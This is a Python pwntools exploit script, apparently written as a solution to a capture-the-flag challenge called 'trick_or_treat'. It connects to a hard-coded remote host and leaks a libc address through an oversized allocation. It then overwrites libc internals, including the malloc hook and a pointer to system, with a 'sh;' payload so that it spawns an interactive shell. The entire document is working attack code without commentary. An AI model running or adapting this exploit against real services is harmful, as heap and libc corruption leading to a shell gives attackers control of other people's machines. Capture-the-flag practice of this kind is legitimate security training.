#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
context.arch="amd64"
pwn_file="./trick_or_treat"
elf=ELF(pwn_file)
libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0

r=remote("3.112.41.140",56746)
#r = remote("127.0.0.1",60001)
#distance = -0x1c000-0xf000
#print "try %s"%hex(distance)
def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.address)
    pause()
def getoff(off):
    return hex((off/8)&0xffffffffffffffff)
#for dist in range(-0x10000,0x10000):
size = 0x10000000
r.sendlineafter('Size:', str(size))
r.recvuntil('Magic:')
leak = r.recvline()
buf = int(leak,16)
libc.address = buf-0x10+size+0x1000
print hex(libc.address)
off = getoff(libc.address+0x3eba40-buf)
val =  hex(libc.address+0x3eba40+0x2000)
r.sendlineafter('Value:', off + ' '+ val)

f = {
    0:libc.address+0x3ed8c0,
    0x1a8:p64(libc.address+0x117cdc),# malloc hook
    0x1a0:p64(libc.sym["system"]),
    0xb40:p64(libc.address+0x3ec638),
    0xbb0:p16(0xd808)*0x100
}
r.recvuntil("Value:")
r.send("sh;\x00\x00"+fit(f,filler="\x00"))
r.sendline("echo 123\n\n\n")
r.sendline("echo 123\n\n\n")
r.recvuntil("123");
r.interactive()



